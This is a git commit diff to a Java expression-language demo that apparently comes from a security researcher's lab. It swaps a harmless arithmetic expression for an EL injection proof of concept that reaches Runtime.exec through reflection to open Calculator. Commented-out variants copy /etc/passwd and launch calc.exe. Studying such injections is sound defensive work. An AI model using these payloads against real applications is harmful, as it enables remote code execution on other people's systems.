5a3c8af21000f8e08eb66eb21193e3dd936ba128
leveryd <leveryd@leveryd.com>
2024-04-15 11:34:21 +0800

    新增jdbc反序列化demo、fat jar配置

--- src/main/java/el/demo/ELExample.java
+++ src/main/java/el/demo/ELExample.java
@@ -4,7 +4,7 @@ import javax.el.*;
 
 public class ELExample {
 
-    public static void main(String[] args) {
+    public static void main(String[] args) throws Exception {
         // 创建一个 ExpressionFactory 实例，它是创建表达式的主要入口
         ExpressionFactory factory = ExpressionFactory.newInstance();
 
@@ -15,11 +15,16 @@ public class ELExample {
         context.getVariableMapper().setVariable("x", factory.createValueExpression(10, int.class));
 
         // 创建一个 ValueExpression 实例，它表示一个表达式，该表达式在求值时将返回一个值
-        ValueExpression expr = factory.createValueExpression(context, "${x * 2}", int.class);
+        // ValueExpression expr = factory.createValueExpression(context, "${x * 2}", int.class);
 
         // 下面的poc都不生效 https://xz.aliyun.com/t/7692
+        // Class.forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"open /System/Applications/Calculator.app");
         // ValueExpression expr = factory.createValueExpression(context, "${''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('cp /etc/passwd /tmp/1')\")}", int.class);
         // ValueExpression expr = factory.createValueExpression(context, "${pageContext.setAttribute(\"a\",\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"\".getClass()).invoke(\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"calc.exe\"))}\n", int.class);
+        ValueExpression expr = factory.createValueExpression(context, "${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"\".getClass()).invoke(\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"open /System/Applications/Calculator.app\")}", int.class);
+
+        //java.lang.Runtime.getMethod("","");
+        //Class.forName("java.lang.Runtime").getMethod()
 
         // 求值表达式并打印结果
         int result = (int) expr.getValue(context);
